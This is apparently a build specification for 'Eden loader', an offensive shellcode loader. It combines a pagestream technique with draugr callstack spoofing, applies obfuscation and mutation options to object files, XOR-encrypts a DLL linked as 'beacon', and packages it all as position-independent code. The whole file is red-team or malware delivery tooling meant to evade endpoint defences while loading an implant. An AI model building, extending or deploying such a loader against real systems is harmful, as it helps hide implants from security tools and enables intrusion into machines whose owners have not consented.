# some meta-info about our capability
name     "Eden loader"
describe "A loader which combines Raphael Mudge's pagestream technique with modular callstack spoofing (i.e. draugr)"
author   "William Burgess / @joehowwolf "

x64:
    generate $DLLKEY 8192
    generate $XORKEY 16

    load "bin/loader.x64.o"
        make pic +optimize +disco +mutate

        load "bin/guardexec.x64.o"
            make object +optimize +disco +mutate
            patch "xorkey" $XORKEY
            import "LoadLibraryA, GetProcAddress, GetModuleHandleA"
            export
            link "guard_exec"

        load "bin/draugr.x64.o"
            make pic
            export
            preplen
            link "draugr"

        push $DLL
            xor $DLLKEY
            preplen
            link "beacon"

        push $DLLKEY
            preplen
            link "key"

        export
